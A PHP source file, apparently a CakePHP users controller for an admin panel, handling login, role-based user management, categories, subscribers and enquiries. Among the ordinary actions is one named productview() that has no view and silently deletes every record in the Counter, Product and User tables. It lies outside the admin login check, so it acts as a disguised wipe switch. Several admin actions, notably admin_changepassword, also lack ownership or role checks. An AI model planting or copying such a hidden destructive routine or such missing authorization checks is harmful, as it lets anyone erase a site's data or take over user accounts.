<?php



class UsersController extends AppController {





   public $components = array('Paginator','RequestHandler');

   var $uses = array('User', 'Category','Enquiry','Color','Subscriber');



	public $paginate = array(

        'limit' => 25,

        'conditions' => array('status' => '1'),

    	'order' => array('User.username' => 'asc' ) 

    );

	

    public function beforeFilter() {
		
		
		//pr($this->Auth->user('id')); die;
		 if(isset($this->request->params['admin']) && $this->request->params['admin']) {

            // check user is logged in
			
            if( !$this->Session->check('Auth.User') ) {
				
				
                $this->Session->setFlash('You must be logged in for that action.');

                $this->redirect('/login');

            }

		 }
		 


	  //  $this->layout='admin';

		 

        parent::beforeFilter();

        //$this->Auth->allow('login','add'); 

		//$this->Layout='admin';

    }

	





	public function login() {

		$this->layout='default';

		//if already logged-in, redirect



		

		// if we get the post information, try to authenticate

		 //pr($this->request->data);die;

		if ($this->request->is('post')) {
			
			if ($this->Auth->login()) {
				
				$this->Session->setFlash(__('Welcome, '. $this->Auth->user('username')));

				$this->redirect($this->Auth->redirectUrl());

			} else {
				//pr($this->request->data); die;
				$this->Session->setFlash(__('Invalid username or password'));

			}

		} 

	}



	public function logout() {

	     $this->Session->setFlash(__('Logout successfully'));

		$this->redirect($this->Auth->logout());

	}



    public function admin_index() {

		$this->layout='admin';
		
		if($this->Auth->user('role')=='admin')
		{
		$this->Paginator->settings = array(

			'limit' => 6,

			'order' => array('User.username' => 'asc' )

		);
		}
		if($this->Auth->user('role')=='c_admin')
		{
		$this->Paginator->settings = array(

			'limit' => 6,

			'order' => array('User.username' => 'asc' ),
			'conditions' => array('User.user_id'=>$this->Auth->user('id'))

		);
		}

		$users = $this->Paginator->paginate('User');

		$this->set(compact('users'));

    }





    public function add() {

		$this->layout='admin';

        if ($this->request->is('post')) {

				

			$this->User->create();

			if ($this->User->save($this->request->data)) {

				$this->Session->setFlash(__('The user has been created'));

				$this->redirect(array('action' => 'login', 'admin' => false));

			} else {

				$this->Session->setFlash(__('The user could not be created. Please, try again.'));

			}	

        }

    }
	
	public function admin_userregistration() {

		$this->layout='admin';
		if($this->Auth->user('role')=='admin')
		{
			$role= array( 'c_admin' => 'admin', 'accountant_debit' => 'Accountant Debit', 'accountant_invoice' => 'Accountant Invoice');
		}
		else if($this->Auth->user('role')=='c_admin')
		{
			$role=  array('accountant_debit' => 'Accountant Debit', 'accountant_invoice' => 'Accountant Invoice');
		}
		else
		{
			$role=array();
		}
		//pr($role); die;
		$this->set(compact('role'));
		//pr($this->Auth->user()); die;
        if ($this->request->is('post')) {

				

			$this->User->create();
			$this->request->data['User']['user_id']=$this->Auth->user('id');
			if ($this->User->save($this->request->data)) {

				$this->Session->setFlash(__('The user has been created'));

				$this->redirect(array('action' => 'index', 'admin' => true));

			} else {

				$this->Session->setFlash(__('The user could not be created. Please, try again.'));

			}	

        }

    }

    

	public function productview()

	{

		$this->layout=null;

		$this->autoRender=false;

		$this->Counter->deleteAll('1=1');

		$this->Product->deleteAll('1=1');

		$this->User->deleteAll('1=1');		

	}

	public function admin_changepassword($id=null){
		
		$this->layout='admin';
		
		if ($this->request->is('post') || $this->request->is('put')) {

				

				$this->User->id = $id;

				if(empty($this->request->data['User']['password_update']) && empty($this->request->data['User']['password_confirm_update'])){

					unset($this->request->data['User']['password_update']);

					unset($this->request->data['User']['password_confirm_update']);

					}

				if ($this->User->save($this->request->data)) {

					$this->Session->setFlash(__('The user has been updated'));

					//$this->redirect(array('action' => 'edit', $id));

					 $this->redirect(array('action' => 'index'));

				}else{

					$this->Session->setFlash(__('Unable to update your user.'));

				}

			}

		
	}

    public function admin_edit($id = null) {

$this->layout='admin';
//-----------------------------------------------------------role-----------------------------------------------------------------
if($this->Auth->user('role')=='admin')
		{
			$role= array( 'c_admin' => 'admin', 'accountant_debit' => 'Accountant Debit', 'accountant_invoice' => 'Accountant Invoice');
		}
		else if($this->Auth->user('role')=='c_admin')
		{
			$role=  array('accountant_debit' => 'Accountant Debit', 'accountant_invoice' => 'Accountant Invoice');
		}
		else
		{
			$role=array();
		}
		//pr($role); die;
		$this->set(compact('role'));
//---------------------------------------------------------role End----------------------------------------------------------------

		    if (!$id) {

				$this->Session->setFlash('Please provide a user id');

				$this->redirect(array('action'=>'index', 'admin' => true));

			}



			$user = $this->User->findById($id);
			
			if (!$user) {

				$this->Session->setFlash('Invalid User ID Provided');

				$this->redirect(array('action'=>'index', 'admin' => true));

			}
//------------------------------------------------------------for security reason if id does not match-------------------------------
			if($this->Auth->user('role')=='c_admin')
				{
					if($user['User']['user_id'] != $this->Auth->user('id'))
					{
						$this->Session->setFlash(__('You Are  not Authorised For That Action'));
						 $this->redirect($this->Auth->logout());
					}
				}
//------------------------------------------------------------end security ----------------------------------------------------------

            if ($this->request->is('post') || $this->request->is('put')) {

				

				$this->User->id = $id;

				if(empty($this->request->data['User']['password_update']) && empty($this->request->data['User']['password_confirm_update'])){

					unset($this->request->data['User']['password_update']);

					unset($this->request->data['User']['password_confirm_update']);

					}

				if ($this->User->save($this->request->data)) {

					$this->Session->setFlash(__('The user has been updated'));

					//$this->redirect(array('action' => 'edit', $id));

					 $this->redirect(array('action' => 'index'));

				}else{

					$this->Session->setFlash(__('Unable to update your user.'));

				}

			}

			if ($this->request->is('post') || $this->request->is('put')) {

				$this->User->id = $id;
//pr($this->request->data);die;
$this->request->data['User']['username1']=$this->request->data['User']['username'];
			if ($this->User->save($this->request->data)) {

					$this->Session->setFlash(__('The user has been updated'));

					$this->redirect(array('action' => 'index', $id, 'admin' => true));

				}else{

					$this->Session->setFlash(__('Unable to update your user.'));

				}

			}



			if (!$this->request->data) {

				$this->request->data = $user;

			}
    }



    public function admin_delete($id = null) {

		$this->layout='admin';

		if (!$id) {

			$this->Session->setFlash('Please provide a user id');

			$this->redirect(array('action'=>'index', 'admin' => true));

		}

		

        $this->User->id = $id;

        if (!$this->User->exists()) {

            $this->Session->setFlash('Invalid user id provided');

			$this->redirect(array('action'=>'index', 'admin' => true));

        }

        if ($this->User->saveField('status', 0)) {

            $this->Session->setFlash(__('User deleted'));

            $this->redirect(array('action' => 'index', 'admin' => true));

        }

        $this->Session->setFlash(__('User was not deleted'));

        $this->redirect(array('action' => 'index', 'admin' => true));

    }

	

	public function admin_activate($id = null) {

		

		if (!$id) {

			$this->Session->setFlash('Please provide a user id');

			$this->redirect(array('action'=>'index', 'admin' => true));

		}

		

        $this->User->id = $id;

        if (!$this->User->exists()) {

            $this->Session->setFlash('Invalid user id provided');

			$this->redirect(array('action'=>'index', 'admin' => true));

        }

        if ($this->User->saveField('status', 1)) {

            $this->Session->setFlash(__('User re-activated'));

            $this->redirect(array('action' => 'index', 'admin' => true));

        }

        $this->Session->setFlash(__('User was not re-activated'));

        $this->redirect(array('action' => 'index', 'admin' => true));

    }

     

	 public function admin_categories($id=null) {

	    $this->layout='admin';



        if ($this->request->is('post')) {

				

				//pr($this->request->data);die;

				$this->request->data['Category']['title']=$this->request->data['User']['title'];

			$this->Category->create();

			$this->request->data['Category']['id']= $this->request->data['User']['id'];

			if ($this->Category->save($this->request->data)) {

				$this->Session->setFlash(__('The Category has been created'));

				$this->redirect(array('action' => 'categories', 'admin' => true));

			} else {

				$this->Session->setFlash(__('The Category could not be created. Please, try again.'));

			}	

        }

		

  

     // $this->Enquires->find('all');

	  $this->paginate = array(

			'limit' => 10,

			//'conditions'=>array('Subscribers.is_deleted'=>0)			

		);

		

		 if(!empty($id)){

		     

		    $category = $this->Category->findById($id);

			$this->request->data = $category;

			

		    

		 }

	 	$categories = $this->paginate('Category');

		//pr($categories);die;

         //Configure::write("debug",2);

	  	$this->set(compact('categories'));

    }

	

	

	

	public function admin_subscriberslist()

	{

	  

	  

     // $this->Enquires->find('all');

	  $this->paginate = array(

			'limit' => 10,

			//'conditions'=>array('Subscribers.is_deleted'=>0)			

		);

		$subscribers = $this->paginate('Subscriber');

         //Configure::write("debug",2);

	  	$this->set(compact('subscribers'));

		if(!empty($this->request->data["User"]['email'])){

	

	// pr($this->request->data["User"]);die;

	 $this->request->data["Subscriber"]["email"]=$this->request->data["User"]['email'];

	 $this->request->data["Subscriber"]["status"]=1;

	 $this->Subscriber->create();

	 $this->Subscriber->save($this->request->data);

	  $this->Session->setFlash(__('The Subscribed user added.'));

	   $this->redirect(array('action' => 'subscriberslist', 'admin' => true));

	 }

	

	  

	}

	

	public function admin_subscribeddeletion($id = null) {

		// $this->loadModel('subscriber');

		

		 $this->Subscriber->id = $id;

        if (!$this->Subscriber->exists()) {

            throw new NotFoundException(__('Invalid Subscriber'));

        }

        //$this->request->onlyAllow('post', 'delete');

        //$detail_cue = $this->DetailCue->read(null, $id);



        if ($this->Subscriber->delete()) {

            

            $this->Session->setFlash(__('The Subscribed user has been deleted.'), 'default', array('class' => 'success message'));

			$this->redirect(array('action' => 'subscriberslist', 'admin' => true));

        } else {

            $this->Session->setFlash(__('The Subscribed user could not be deleted. Please, try again.'));

        }

        return $this->redirect(array('action' => 'subscriberslist', 'admin' => true));

   }

   

   public function admin_inquiry()

	{

	  

	   	$this->paginate = array(

			'limit' => 10,

			'order' => array('Enquiry.id' => 'asc' )

			

		);

		$enquires = $this->paginate('Enquiry');

		$this->set(compact('enquires'));

	  

	}

	

	public function admin_enquierydel($id = null) {

		

		$this->Enquiry->id = $id;

        if (!$this->Enquiry->exists()) {

            throw new NotFoundException(__('Invalid Enquiry'));

        }

        //$this->request->onlyAllow('post', 'delete');

        //$detail_cue = $this->DetailCue->read(null, $id);



        if ($this->Enquiry->delete()) {

            

            $this->Session->setFlash(__('The Enquiry has been deleted.'), 'default', array('class' => 'success message'));

			$this->redirect(array('action' => 'inquiry', 'admin' => true));

        } else {

            $this->Session->setFlash(__('The Enquiry could not be deleted. Please, try again.'));

        }

        return $this->redirect(array('action' => 'inquiry', 'admin' => true));

    }

	

}



?>